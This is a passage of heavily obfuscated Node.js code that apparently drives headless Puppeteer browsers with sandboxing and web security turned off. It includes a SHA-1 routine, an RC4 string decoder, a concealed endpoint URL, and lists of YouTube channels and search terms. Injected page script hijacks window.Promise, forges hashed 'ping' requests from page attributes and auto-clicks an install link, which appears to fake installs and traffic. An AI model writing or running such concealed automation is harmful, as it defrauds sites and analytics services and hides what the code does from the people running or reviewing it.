-0xa0e] = J[-0x623 + -0x33e * 0x3 + 0x1 * 0xfe9] = J[0x29f + -0x1a90 + 0x17fe] = J[0x1569 * -0x1 + 0x1 * 0x1ae8 + -0x571] = J[-0x7 * -0xb7 + 0x1 * 0x13be + -0x18b * 0x10] = -0x671 * 0x5 + -0x15 * -0x1cf + -0x5c6), J[-0xed9 + -0x153 + 0x103a] = this['hBytes'] << -0x2247 + 0x4f1 * 0x1 + -0xb * -0x2ab | this['bytes'] >>> 0x1 * 0x18f5 + -0x139 * -0x1d + -0x3c4d, J[0x1f8d + 0x21c6 + -0x4144] = this['bytes'] << 0x1904 + 0x1bad + -0x34ae, this['hash']();
              }
            }
            ['hash']() {
              var J, K, L = this['h0'],
                M = this['h1'],
                N = this['h2'],
                O = this['h3'],
                P = this['h4'],
                Q = this['blocks'];
              for (J = -0x241 + -0xceb + 0xf3c; J < -0x15d8 + 0x114c + 0x4dc * 0x1; ++J)
                K = Q[J - (0x50c + 0x1f3 + 0x254 * -0x3)] ^ Q[J - (-0x229d + -0x42d * -0x9 + -0x2f0)] ^ Q[J - (-0x1dc3 + 0x325 * -0x9 + 0x3a1e)] ^ Q[J - (-0x1 * 0x1754 + -0x1a19 + 0x317d)], Q[J] = K << -0x1 * -0xd15 + 0x2220 + -0x13 * 0x27c | K >>> 0xc12 * -0x2 + -0x2e3 * -0xb + 0x112 * -0x7;
              for (J = 0x2 * 0xdcc + -0xb3 * 0x12 + -0xe2 * 0x11; J < -0x1 * -0x1884 + -0x1acf + -0x1 * -0x25f; J += -0x184c + -0x198c + 0x9f9 * 0x5)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x1453 + -0x4 * 0x803 + -0x1a32 * -0x2 | L >>> 0x992 + 0x135 + -0xaac) + (M & N | ~M & O) + P + (0x4d46898 * -0x3 + -0x474f87f8 + 0xb04f3b59) + Q[J] << 0x32 * 0x19 + 0x108e + -0x1570) << -0x2309 * 0x1 + -0xe47 + 0x3155 | P >>> 0x33 * 0x17 + 0xf46 + -0x4 * 0x4f0) + (L & (M = M << -0x17ef + -0x1f * -0x25 + -0x14e * -0xf | M >>> 0x242 + -0x1cf5 * 0x1 + 0x1ab5) | ~L & N) + O + (-0x5c3d8 * -0x22a + -0x30863ef3 + -0x1dc7457 * -0x44) + Q[J + (0xb39 * 0x2 + 0xd33 + -0x23a4)] << -0x2 * 0x6f + 0xc * -0x2b7 + 0x2172) << 0x1bc2 + -0x13 * 0x21 + 0x6 * -0x437 | O >>> -0x2 * 0xdf3 + -0x3 * -0x936 + -0x1 * -0x5f) + (P & (L = L << -0x4 * -0x597 + -0x9ce + 0xc7 * -0x10 | L >>> 0x1f * 0x134 + 0x10c8 + -0x3612) | ~P & M) + N + (0xdd52fc + 0x1166378 * -0x5f + 0xc0f41025) + Q[J + (-0x1746 + 0x13ac + 0x39c)] << 0x579 + 0xe44 * 0x1 + 0x1f * -0xa3) << 0x1ca0 + -0xc9d + -0xffe | N >>> -0x1912 * -0x1 + 0x1c7e + 0x253 * -0x17) + (O & (P = P << 0x2405 + 0x43a * 0x8 + 0x173d * -0x3 | P >>> 0x1e35 + -0xee1 * -0x1 + -0x2d14) | ~O & L) + M + (-0x18182fa4 * -0x7 + -0x40bca352 + -0x1 * 0xd6a3091) + Q[J + (-0x1716 + -0x10f * -0x1b + 0x4e * -0x12)] << -0x13 * -0x23 + -0x13d2 + -0x1139 * -0x1) << 0x1b9c + 0x685 * 0x2 + -0xd8b * 0x3 | M >>> 0xc7c + -0x247 + -0xa1a) + (N & (O = O << -0x1463 + 0x179d + -0x31c | O >>> 0x92 * -0x7 + -0x1 * 0x1c9d + 0xadf * 0x3) | ~N & P) + L + (-0x8664996a + -0x1 * 0x68f54b45 + -0x12576e * -0x11fc) + Q[J + (0x195e + -0x1 * -0x20c5 + -0x3a1f)] << -0x3a7 * -0x3 + -0x74f + -0x3a6, N = N << -0x25cc + -0x19 * 0x85 + 0x32e7 | N >>> -0xa92 + -0x1 * 0xd + 0x3 * 0x38b;
              for (; J < 0x984 + -0x5b3 * 0x5 + 0x1323; J += -0x10ed * -0x2 + -0x121d * -0x1 + -0x33f2)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x3f0 + 0x588 + -0x29 * 0x3b | L >>> 0x2c2 + 0xcbc + -0x521 * 0x3) + (M ^ N ^ O) + P + (-0xc6247ceb + -0x2 * -0x5937c1ca + 0x44 * 0x1eb835e) + Q[J] << 0x1c9 * -0x1 + -0x6cd * -0x2 + 0x1 * -0xbd1) << -0x17b3 * 0x1 + 0x229f + -0x1 * 0xae7 | P >>> 0x56e + 0x169 * 0xc + -0x163f * 0x1) + (L ^ (M = M << -0x1 * 0x1e72 + -0x20 * -0xdc + 0x310 | M >>> 0x1a8a + 0x1111 + -0x2b99 * 0x1) ^ N) + O + (-0xcbf8922 + -0x193be64 * 0x65 + -0x39bb1 * -0x4e67) + Q[J + (0x9 * 0x2d6 + 0x197 * -0x1 + -0x17ee)] << 0x2043 + -0x368 + 0x59 * -0x53) << 0xe70 + -0x25a3 + 0x1738 | O >>> -0x11ee + -0x1c9 * 0xd + 0x149f * 0x2) + (P ^ (L = L << -0x5 * 0x629 + -0x5fc + 0x8d * 0x43 | L >>> 0x1aaa + 0xc96 + -0x273e) ^ M) + N + (-0x8efe1785 + -0x1 * 0xd2cafc19 + 0x1d0a2ff3f) + Q[J + (-0x1 * -0x1223 + 0x2 * -0x9db + -0xf * -0x1b)] << -0xd * 0x241 + 0x42d + 0x1920) << 0x29c * -0xd + -0x1 * 0x240a + 0x5 * 0xdff | N >>> 0x1c6 * -0x16 + 0x1 * 0xd06 + 0x1 * 0x1a19) + (O ^ (P = P << 0x5 * 0x2a5 + -0x1cf3 + 0xfd8 | P >>> -0xb9a + 0x2579 + -0x19dd) ^ L) + M + (0x83d3a301 + -0x24446eff + 0xf4ab79f) + Q[J + (-0x60e + 0x25 * 0x51 + 0x2d2 * -0x2)] << -0x1f42 + 0x4f3 * -0x2 + -0xa4a * -0x4) << 0x90d * -0x3 + -0x1b07 + 0x3633 | M >>> -0x1dc4 + 0x1b9b + 0x244) + (N ^ (O = O << 0x1 * 0x115f + -0x4a * 0x3f + -0xf5 * -0x1 | O >>> 0x1a9e + 0x5 * -0x336 + 0x547 * -0x2) ^ P) + L + (0x7f1e380c + 0x89bfb9d * 0x2 + -0x217c43a5) + Q[J + (0x190f + -0x1f01 * -0x1 + -0x1c06 * 0x2)] << -0x1071 + -0x397 * 0x3 + 0x1b36, N = N << -0x16ce + 0x1366 + 0x52 * 0xb | N >>> -0x47f * 0x3 + 0x1e5 * 0x6 + -0x221 * -0x1;
              for (; J < -0x2250 + 0x991 + 0x18fb; J += -0x691 * -0x1 + 0x12e6 + -0x1972)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x131c + 0x21 * 0x87 + -0x207 * 0x12 | L >>> 0x1de1 + 0x36c + -0x2 * 0x1099) + (M & N | M & O | N & O) + P - (-0xcb36e0c8 + 0xb6fc5ac0 + -0x45 * -0x1ede53c) + Q[J] << -0xffa + 0x13a5 + -0x3 * 0x139) << -0x4 * -0x9b1 + -0x1 * -0x1efd + -0x45bc | P >>> -0xbf * -0x26 + 0x606 * -0x2 + 0x8f * -0x1d) + (L & (M = M << -0x266f * -0x1 + -0x25ee + -0x63 | M >>> 0x19 * 0x18f + 0x2bc * -0xa + -0xb9d) | L & N | M & N) + O - (-0xb6c3646c + -0xa * 0x10136a0b + 0x2 * 0xe434e5ff) + Q[J + (0x119 + -0x119b + 0x1083)] << -0x1284 + -0x1183 + 0x2407) << 0x15aa * 0x1 + 0x1d6 + 0x177b * -0x1 | O >>> -0x10c9 * -0x1 + -0x5d * 0x5 + 0x2f9 * -0x5) + (P & (L = L << -0x15a7 + -0x160f + 0x2bd4 | L >>> -0x2119 + 0x3 * 0x529 + 0x5e0 * 0x3) | P & M | L & M) + N - (0x1b2a2c62 + -0x1 * -0x9be10ed9 + -0x4626f817) + Q[J + (0x1e62 + -0xea * -0xd + -0x2a42)] << 0x2227 + 0x26f8 + -0x491f) << -0x40f + 0xc46 + -0x832 | N >>> -0x259 * 0xe + -0xfb4 * -0x1 + 0x1 * 0x1145) + (O & (P = P << -0x342 + 0x67 * 0x51 + -0x1d37 | P >>> -0x1ccc + -0x16f0 + 0x33be) | O & L | P & L) + M - (-0x2458022a * 0x3 + -0x140d55 * -0x166 + 0xc1e1a4c4) + Q[J + (-0x2610 + 0xe8c + 0x1787)] << -0x331 * -0x7 + 0x603 + -0x1c5a) << 0x9f3 * 0x3 + 0x21d1 + -0x3fa5 | M >>> 0xb44 + -0x8b2 + -0x277) + (N & (O = O << -0xce * -0x13 + 0x4 * 0x83 + 0x1 * -0x1138 | O >>> -0x1db6 + -0x65 * -0x11 + -0x1 * -0x1703) | N & P | O & P) + L - (-0x679a6ae1 + 0xccaaeb * -0x6e + 0xdf500b * 0x15d) + Q[J + (0xbc + 0x25 * -0x63 + 0xd97)] << -0x1d8c + -0x1 * 0x1ad2 + 0x385e, N = N << -0x21c2 + -0xc3 * -0x24 + 0x674 | N >>> -0x141d + 0x48b * -0x1 + 0x386 * 0x7;
              for (; J < -0x2597 + -0x291 + 0x8 * 0x50f; J += -0x527 * 0x1 + -0x1 * -0x1ba1 + -0x1 * 0x1675)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x14 + -0x23c7 * 0x1 + 0x23b8 | L >>> -0x7cf * -0x1 + 0x3 * -0x755 + 0xe4b) + (M ^ N ^ O) + P - (0x32d242f2 + 0x641f3fc0 + -0x61544488) + Q[J] << 0x47 * 0x76 + 0x8 * -0x39b + -0x7 * 0x8e) << 0x1e9d + -0x503 * 0x7 + 0x47d | P >>> -0x1d86 + 0x23f6 * 0x1 + -0x655) + (L ^ (M = M << -0x728 * -0x1 + -0x1c31 + 0x70d * 0x3 | M >>> 0x5 * -0x13b + -0x24d2 + 0x2afb * 0x1) ^ N) + O - (0x3 * 0x97eaf8e + 0x9e * -0x846162 + 0x6ad549fc) + Q[J + (0x1662 + -0x5f6 + 0x1d3 * -0x9)] << -0xcd9 + 0x4a4 + 0x1 * 0x835) << -0x2 * 0x129b + -0x19f4 * -0x1 + 0x1 * 0xb47 | O >>> 0x18e2 + 0x1ce6 + -0x35ad) + (P ^ (L = L << 0xcb4 + -0x522 * -0x4 + 0x12 * -0x1d7 | L >>> 0xddb * -0x2 + -0xc7e + 0x141b * 0x2) ^ M) + N - (-0x419f7ee4 + 0x7cf1886 + 0x6f6da488) + Q[J + (0xcc1 + -0x31f * -0x2 + -0x1 * 0x12fd)] << -0x1 * 0x242 + -0x2fd * 0x8 + 0x1a2a) << 0xbc1 + -0x1423 + 0x867 | N >>> 0x413 * -0x7 + 0x1ca8 + -0x8) + (O ^ (P = P << 0x43 * 0x1a + -0x6 * 0x4df + 0x168a | P >>> 0x856 + -0x2 * 0x556 + 0x258) ^ L) + M - (0x3 * 0x15308a57 + 0x31ca * -0x560c + 0x6c7d09d) + Q[J + (0x3 * 0x61 + 0x38 * -0x38 + 0xb20)] << -0x1d * -0x43 + -0xaf2 + -0x1 * -0x35b) << 0x1755 + 0x98b + -0x1 * 0x20db | M >>> 0x1b * -0x77 + 0x6dc + 0x4 * 0x173) + (N ^ (O = O << 0x3 * -0xb66 + -0x218 + 0x2468 | O >>> -0x17b4 + -0x1 * -0x2fb + 0x6e9 * 0x3) ^ P) + L - (0x1aa2b499 * -0x1 + -0xe9c397 * 0xb + -0xb496b48 * -0x8) + Q[J + (-0x1b83 * -0x1 + 0x12f7 + 0x272 * -0x13)] << 0x640 + 0x26ed * -0x1 + 0x20ad, N = N << -0x1 * 0x9c2 + -0x13c7 + 0x1da7 | N >>> -0xf47 * 0x1 + -0x1407 + -0x71 * -0x50;
              this['h0'] = this['h0'] + L << -0xa5 * 0x1a + -0x2427 + -0x7 * -0x78f, this['h1'] = this['h1'] + M << 0x1 * 0x79f + 0xf26 + 0xc9 * -0x1d, this['h2'] = this['h2'] + N << 0x1c0f + 0x113 * -0x17 + -0x35a, this['h3'] = this['h3'] + O << -0x2375 + 0x2699 * 0x1 + -0x6 * 0x86, this['h4'] = this['h4'] + P << -0x825 + 0x151 * -0x1d + 0x2e52;
            }
            ['hex']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return w[J >> 0x1e6f * -0x1 + -0xd2 * -0x21 + 0x379 & 0x1 * 0x373 + 0x123 * 0x13 + 0x1 * -0x18fd] + w[J >> -0x136d * 0x2 + 0x1a1c + 0x1f * 0x6a & 0x170b * 0x1 + 0x95 * 0x18 + 0xdc * -0x2b] + w[J >> -0x5 * 0x10b + 0x2503 + 0x2 * -0xfdc & 0x1629 + 0x2 * -0x531 + -0xbb8] + w[J >> -0x1d01 + -0x64b * 0x4 + 0x363d & -0x16f7 + 0x3c * 0x43 + 0x752] + w[J >> -0x2 * 0x1057 + -0x7c8 + 0x2882 & -0x11d1 + -0x1be * 0xd + -0x1 * -0x2886] + w[J >> -0x1 * -0x1075 + 0x1d9b + 0x18 * -0x1eb & -0x369 * 0x2 + 0x19b6 + -0x3 * 0x647] + w[J >> -0x3a2 + -0x4 * -0x19 + 0x342 & -0xf2 * 0xa + -0x5b * -0x59 + -0x30 * 0x76] + w[0x1a09 + -0x7 * -0x4e9 + -0x3c59 & J] + w[K >> -0x99f + 0x1 * 0x1d2f + -0x1374 & 0x1bea + 0x3 * -0x5f9 + -0x9f0] + w[K >> -0x2 * -0x355 + 0x584 * -0x4 + 0xf7e & 0x1fbb + 0x1b28 * -0x1 + 0x1 * -0x484] + w[K >> 0x2136 + 0x5 * 0x5a6 + 0x1eb0 * -0x2 & -0x221f + -0x12ec + 0x1 * 0x351a] + w[K >> 0x90e * 0x3 + 0x9a1 + -0x24bb & -0xbce + -0x1 * -0xc4d + 0x38 * -0x2] + w[K >> -0x15a * 0x18 + -0x1 * 0xc75 + -0x41 * -0xb1 & 0xd38 + -0x16db + 0x9b2 * 0x1] + w[K >> 0x2198 + 0x18fb + 0x85d * -0x7 & 0x24d3 + -0x13 * 0x1a5 + 0x3 * -0x1d7] + w[K >> 0x25dd + -0x1d4 + -0x2405 & -0x1c3 * 0x14 + 0xb51 + 0x17fa] + w[0xecf + -0x22f7 + 0x1437 & K] + w[L >> 0x3 * -0x350 + -0x33c + 0xd48 & -0x1 * -0x163d + -0x2 * -0xf3b + -0x34a4] + w[L >> -0x1076 + -0xb5 + -0x1eb * -0x9 & 0x1 * 0x40 + 0x2305 + -0x2336] + w[L >> 0x16b3 + 0xa89 + 0x425 * -0x8 & 0xb2b + -0x145a + 0x93e] + w[L >> 0x1360 + 0xa9c + -0x1dec & -0x5 * -0x60b + -0x927 + 0x11b * -0x13] + w[L >> -0x1b7c + 0x107 * -0x1 + -0x1 * -0x1c8f & -0x138b + -0x1cf3 + -0x3 * -0x102f] + w[L >> -0x2 * -0xf95 + -0x1 * 0x14 + -0x3 * 0xa5a & 0x849 + -0x508 + -0x332 * 0x1] + w[L >> 0x9de + -0x1103 + 0x27 * 0x2f & -0x536 + -0x1 * -0xe2f + 0xe * -0xa3] + w[-0xacf * -0x2 + 0x951 * 0x1 + -0x1ee0 & L] + w[M >> 0x70a + -0x1a49 + 0x1 * 0x135b & -0x1bf5 + 0x103 + 0x1b01 * 0x1] + w[M >> 0xd3a + 0x4a5 * 0x1 + -0x11c7 & -0x25fa + 0x2511 + 0x2 * 0x7c] + w[M >> -0x1 * 0xb6f + -0x1d90 + -0x2bd * -0xf & 0x126a * 0x1 + 0x1e4c + -0x2f * 0x109] + w[M >> -0x5b * -0x17 + 0x1f68 + -0x2785 & -0x168b + -0x1e1e + 0x4 * 0xd2e] + w[M >> -0xd * 0x1c6 + 0x1484 + -0x2 * -0x14b & -0x2 * -0x1352 + 0xee9 * -0x2 + -0x8c3 * 0x1] + w[M >> -0xa1 * 0x21 + -0x24d3 + 0x399c & 0x1 * 0x20cb + 0x1 * -0x44d + -0x1c6f] + w[M >> 0xaac * 0x2 + 0x49 * -0x43 + 0x239 * -0x1 & 0x3d2 + 0x705 + 0x6 * -0x1cc] + w[0x2 * 0x2b1 + -0x9d * 0x2 + -0x419 & M] + w[N >> 0x3ad * 0x5 + -0x1d37 + -0x1 * -0xaf2 & -0x12aa + 0x7 * 0x211 + 0x442] + w[N >> 0x6 * 0x28c + -0x1d * 0x77 + -0x1b5 * 0x1 & -0x2 * -0x665 + 0x2b * -0xe2 + -0x3 * -0x869] + w[N >> -0xfb5 + -0x254e + 0x3517 * 0x1 & 0x170c + -0xe * 0x17d + -0x1d * 0x13] + w[N >> -0x9 * 0x47 + 0x1 * -0x1e13 + 0x20a2 & 0x1 * -0x16a2 + 0x4 * -0x268 + 0x2051] + w[N >> 0x1a1c + -0x6b9 * -0x4 + 0x34f4 * -0x1 & 0x1ac + -0x17fb + 0x165e] + w[N >> -0x3 * 0x496 + 0x3e * 0x2b + 0x1b0 * 0x2 & -0x4f * -0x3b + 0x1 * -0x19a + 0x846 * -0x2] + w[N >> 0x60 * 0x57 + -0x4 * 0x31 + -0x1fd8 & 0x67d * -0x3 + -0x18 * -0x6d + 0x94e * 0x1] + w[0x37d + 0xd42 + -0x10b0 & N];
            }
            ['digest']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return [
                J >> 0x1990 + 0xd5b + 0x3 * -0xcf1 & -0x1 * -0x219f + -0x1918 + -0x788,
                J >> 0x2173 + 0x2423 * -0x1 + 0x2c0 & 0x448 * -0x2 + -0x6b2 * 0x3 + -0x1da5 * -0x1,
                J >> -0x2389 + 0x102b + 0x1366 & -0x251e + -0x22b4 + 0x48d1,
                0x74f * 0x5 + 0x3cd * -0x5 + -0x108b & J,
                K >> -0x6d * -0x49 + -0x26bd + 0x7c0 & 0x1 * 0x1a29 + 0xde7 + -0x2711,
                K >> 0x29 * 0x43 + -0x69 * 0x2b + -0x8 * -0xdf & -0xc05 + -0x140a + 0x210e * 0x1,
                K >> -0x1b7f + 0x1 * 0x7dd + 0x1 * 0x13aa & -0x1ccd * -0x1 + -0x1e1e + -0x10 * -0x25,
                -0x1d0d + 0x371 * -0x2 + 0x24ee & K,
                L >> -0xc * 0x35 + 0x22be + -0x202a & -0x9df * -0x1 + 0xe11 + -0x16f1,
                L >> -0x1 * -0x1431 + 0xe23 + 0x4 * -0x891 & 0x1404 + -0x7f * 0x3e + 0xbbd,
                L >> -0x1 * 0x25d3 + -0x22d3 + 0x2457 * 0x2 & -0xfd9 + 0xe24 + 0x2b4,
                -0x1ab5 + 0xa9c + 0x88c * 0x2 & L,
                M >> 0x128 * 0x5 + -0xb03 + 0x553 & 0x44b + -0x4 * 0x521 + 0x1d * 0x98,
                M >> -0x3bf + 0xa99 * 0x3 + -0x1bfc & -0x14b6 + 0x1b72 + -0x1 * 0x5bd,
                M >> 0x28c * 0xe + 0x476 * 0x2 + 0xb23 * -0x4 & -0x199 * 0x6 + 0x2573 + -0x1ade,
                0x2d4 * 0xb + 0x1 * 0x71a + -0x2537 & M,
                N >> -0x1 * -0x22be + 0x462 + -0x2708 & 0x1ec2 + -0x6c9 + -0x16fa,
                N >> -0xd0d * -0x1 + -0x22f8 + 0x15fb & 0x91f * -0x1 + -0x3d6 * -0x3 + -0x164,
                N >> 0xe5a + -0x10f5 + 0x1 * 0x2a3 & 0x26ec + 0x1 * 0x1079 + -0xb * 0x4f2,
                -0x1e4 + -0x3 * 0xaaf + 0x22f0 & N
              ];
            }
            ['arrayBuffe' + 'r']() {
              var J, K;
              return this['finalize'](), J = new ArrayBuffer(-0x20d9 + 0x225f + -0xb9 * 0x2), (K = new DataView(J))['setUint32'](0x1 * -0x4ed + -0xf65 + 0x1452, this['h0']), K['setUint32'](-0x7c * 0x20 + -0x260f + 0x3593, this['h1']), K['setUint32'](-0x92 * 0x44 + -0x1 * -0xe4b + 0x1885 * 0x1, this['h2']), K['setUint32'](0xc59 + -0xf4 * 0x1b + 0xd6f, this['h3']), K['setUint32'](-0x23a1 * 0x1 + -0xbf * -0x32 + -0x19d, this['h4']), J;
            }
        }
        G['prototype']['toString'] = G['prototype']['hex'], G['prototype']['array'] = G['prototype']['digest'];
        const H = C();
        window['localStora' + 'ge']['setItem']('manualOver' + 'rideInstal' + 'lJS', '1');
        let I = document['getElement' + 'sByClassNa' + 'me']('install-li' + 'nk')[0x52 * -0x22 + 0x18ae + -0xdca];
        return window['Promise'] = class extends window['Promise'] {
          constructor(...J) {
            let K = 0x1546 + 0x26d + -0x17b3;
            J[0x1 * -0x2705 + 0x11bc + 0x1549]['toString']()['includes']('getAttribu' + 'te(\x22data-p' + 'ing-url') && (J[0x10cb + -0x1862 + 0x797] = L => {
              let M = I['getAttribu' + 'te']('data-ping-' + 'url');
              if (M) {
                let N = H(I['getAttribu' + 'te']('data-ip-ad' + 'dress') + I['getAttribu' + 'te']('data-scrip' + 't-id') + I['getAttribu' + 'te']('data-ping-' + 'key')),
                  O = new XMLHttpRequest();
                O['open']('POST', M + ('&mo=3&ping' + '_key=') + encodeURIComponent(N), -0x1e6e + 0x1 * -0x10dd + -0x17a6 * -0x2), O['overrideMi' + 'meType']('text/plain'), O['onload'] = () => {}, O['send'](), K = -0x4bd + -0x13d8 + 0x1896;
              }
            }), K || super(...J);
          }
        }, window['setTimeout'](() => {
          I['click']();
        }, -0x19 * -0x155 + -0x1612 + -0x55f), Promise['resolve'](-0x165f + 0x498 + 0x11c8);
      })), log('after...'), await new Promise(w => setTimeout(w, NETWORK_PATIENCE)), await s['close'](), await r['close'](), i())) : (await s['close'](), await r['close'](), i());
    }
  }
  for (let j = -0x3 * 0x731 + -0xf * 0xb2 + 0x2001; j < 0x245b + -0x99a * -0x3 + -0xd08 * 0x5; j++)
    i();
}
const NETWORK_PATIENCE = -0xc29 + 0x1 * 0x28fb + 0x26e + (-0x16dd + -0x17e1 * -0x1 + 0xab4) * Math['random'](),
  MM_NETWORK_PATIENCE = (0x1 * 0x871 + -0x7 * 0x1a7 + 0x323) * NETWORK_PATIENCE,
  url = require('url'),
  doFlags = {
    'doActivateBrowser': 0x1,
    'doGF': 0x0,
    'doSoundCloud': 0x0,
    'doYT': 0x0,
    'doMediumReader': 0x0,
    'doRemoteCaptcha': 0x0,
    'doDual': 0x0,
    'doWhitepagesMode': 0x1,
    'doMiscNetActivity': 0x1,
    'doOUJS': 0x1,
    'doCreateServer': 0x1,
    'doExtFingerprint': 0x1
  },
  {
    log: log,
    warn: warn
  } = console,
  {
    floor: floor,
    random: random,
    ceil: ceil
  } = Math;

function d(b, c) {
  const e = a();
  return d = function(f, g) {
    f = f - (-0x1 * -0x22e1 + 0x121e + -0x34ff);
    let h = e[f];
    return h;
  }, d(b, c);
}

function b(c, d) {
  const e = a();
  return b = function(f, g) {
    f = f - (-0x1 * -0x22e1 + 0x121e + -0x34ff);
    let h = e[f];
    if (b['StlfuA'] === undefined) {
      var i = function(n) {
        const o = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let p = '',
          q = '';
        for (let r = -0x1bea + 0x8c5 + 0x1325, s, t, u = -0xf * 0x7f + 0x2 * -0x85a + 0x1825 * 0x1; t = n['charAt'](u++); ~t && (s = r % (-0x5 * -0x6d1 + -0x123a + -0x32b * 0x5) ? s * (0x2f4 * -0xd + -0x767 + 0x2e0b) + t : t, r++ % (0x1 * -0xbfb + 0x5 * -0x3d3 + 0xf8f * 0x2)) ? p += String['fromCharCode'](-0x18fc + 0x2d5 + 0x1726 & s >> (-(-0x16e0 + 0x4cb + 0x1a5 * 0xb) * r & -0x2649 * 0x1 + 0x79 + 0x14e * 0x1d)) : 0x6 * -0x2a5 + 0x1517 + -0x539) {
          t = o['indexOf'](t);
        }
        for (let v = -0x5a7 * -0x3 + -0x6fd + 0x74 * -0x16, w = p['length']; v < w; v++) {
          q += '%' + ('00' + p['charCodeAt'](v)['toString'](-0x1 * 0x1ae0 + -0x52b + 0x201b))['slice'](-(0x1438 + 0x154c * -0x1 + -0x8b * -0x2));
        }
        return decodeURIComponent(q);
      };
      const m = function(n, o) {
        let p = [],
          q = 0x1222 + -0x22c5 + 0x10a3 * 0x1,
          r, t = '';
        n = i(n);
        let u;
        for (u = -0x20 * -0x98 + 0x10bf + -0x23bf * 0x1; u < 0x2d1 * 0x6 + 0xd07 + -0x5c9 * 0x5; u++) {
          p[u] = u;
        }
        for (u = -0x18f1 * 0x1 + 0x3f * 0xb + 0x163c; u < 0xbf * -0x1 + -0xb * 0x317 + 0x23bc * 0x1; u++) {
          q = (q + p[u] + o['charCodeAt'](u % o['length'])) % (0x1327 + 0x22ba * -0x1 + 0x1 * 0x1093), r = p[u], p[u] = p[q], p[q] = r;
        }
        u = -0x25b * -0xd + 0x2 * 0x5f9 + -0x1 * 0x2a91, q = -0x212f + 0x2 * 0xb3e + 0xb * 0xf9;
        for (let v = 0x2db * -0x5 + -0x1250 + 0x2097; v < n['length']; v++) {
          u = (u + (0x6c * -0x35 + -0xd52 + 0x15 * 0x1b3)) % (-0x152b * -0x1 + -0x667 + -0x6e2 * 0x2), q = (q + p[u]) % (-0x291 * 0xd + 0x651 + 0x1c0c), r = p[u], p[u] = p[q], p[q] = r, t += String['fromCharCode'](n['charCodeAt'](v) ^ p[(p[u] + p[q]) % (-0x1e19 + -0x24eb + 0x4404)]);
        }
        return t;
      };
      b['Iibcvn'] = m, c = arguments, b['StlfuA'] = !![];
    }
    const j = e[0x1 * 0xdd5 + 0x1e8f * 0x1 + 0xc * -0x3b3],
      k = f + j,
      l = c[k];
    return !l ? (b['oEbBct'] === undefined && (b['oEbBct'] = !![]), h = b['Iibcvn'](h, g), c[k] = h) : h = l, h;
  }, b(c, d);
}
let PROCESSED_XURL_VAL = 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/gen_dd_' + 'adkjasbdjq' + 'wkjndwqkdw' + 'qasczxhgcx' + 'zc',
  PROCESSED_SYX_VAL = 'CX001_ZCa';
const pptOptions = {
    'headless': 0x1,
    'setDefaultNavigationTimeout': 0x0,
    'setDefaultTimeout': 0x0,
    'args': [
      '--no-sandb' + 'ox',
      '--disable-' + 'setuid-san' + 'dbox',
      '--disable-' + 'dev-shm-us' + 'age',
      '--disable-' + 'web-securi' + 'ty'
    ]
  },
  axios = require('axios'),
  fetch = require('node-fetch'),
  channels = [
    'https://ww' + 'w.youtube.' + 'com/@Taskm' + 'aster',
    'https://ww' + 'w.youtube.' + 'com/@MrBea' + 'st',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCAiLfjN' + 'XkNv24uhpz' + 'UgPa6A',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCIPPMRA' + '040LQr5QPy' + 'JEbmXA',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCUaT_39' + 'o1x6qWjz7K' + '2pWcgw',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UC4-79UO' + 'lP48-QNGgC' + 'ko5p2g',
    'https://ww' + 'w.youtube.' + 'com/@quade' + 'caX8',
    'https://ww' + 'w.youtube.' + 'com/@watch' + 'er',
    'https://ww' + 'w.youtube.' + 'com/@Zyeni' + 'th',
    'https://ww' + 'w.youtube.' + 'com/@RyanG' + 'eorge',
    'https://ww' + 'w.youtube.' + 'com/@Legal' + 'Eagle',
    'https://ww' + 'w.youtube.' + 'com/@jacks' + Z(0x7, 'p%y@'),
    'https://ww' + 'w.youtube.' + 'com/@fanta' + 'no',
    'https://ww' + 'w.youtube.' + 'com/@NerdE' + 'xplains',
    'https://ww' + 'w.youtube.' + 'com/@HowTo' + 'Basic',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCxjrNGr' + 'X188Riipfm' + 'vejjsg'
  ];
((() => {
  Array['prototype']['repeatExte' + 'nd'] = function(h) {
    let i = this,
      j = i;
    for (let k = 0x6 * 0x1a2 + -0x264d * -0x1 + 0x7 * -0x6df; k < h; k++)
      j = j['concat'](i);
    return j;
  }, Array['prototype']['random'] = function() {
    return this[floor(random() * this['length'])];
  };
  const f = new Map();
  Array['prototype']['randomFlus' + 'h'] = function(h) {
    let i = this[floor(random() * this['length'])];
    f['has'](h) || f['set'](h, new Set());
    const j = f['get'](h);
    for (; j['has'](i);)
      j['size'] === this['length'] && j['clear'](), i = this[floor(random() * this['length'])];
    return j['add'](i), i;
  };
})());
let searchTerms = [];
searchTerms['push'](('moomoo.io,' + 'moomoo.io\x20' + 'hack,moomo' + 'o.io\x20defea' + 'ting\x20hacke' + 'rs,moomooi' + 'o,moomoo.i' + 'o\x20mods,moo' + 'moo.io\x20ins' + 'ta\x20kill,mo' + 'omoo.io\x20sa' + 'ndbox,moom' + 'oo.io\x20hack' + 's,moomoo.i' + 'o\x20base,moo' + 'moo.io\x20wor' + 'ld\x20record,' + 'moomoo.io\x20' + 'hacker,moo' + 'moo.io\x20hac' + 'k\x20link,moo' + 'moo.io\x20hig' + 'h\x20score,mo' + 'omoo.io\x20tr' + 'olling,moo' + 'moo.io\x20def' + 'eating\x20aut' + 'o\x20healers,' + 'moomoo.io\x20' + 'raiding\x20ba' + 'ses,moomoo' + '.io\x20update' + ',moomoo.io' + '\x202,moomoo.' + 'io\x20tutoria' + 'l,moomoo.i' + 'o\x20gameplay' + ',moomoo.io' + '\x20new\x20updat' + 'e,moomoo.i' + 'o\x20instakil' + 'l,moomoo.i' + 'o\x20highligh' + 'ts,moomoo.' + 'io\x20game')['split'](',')), searchTerms['push'](('mrbeast,mr' + '\x20beast,mrb' + 'east\x20team,' + 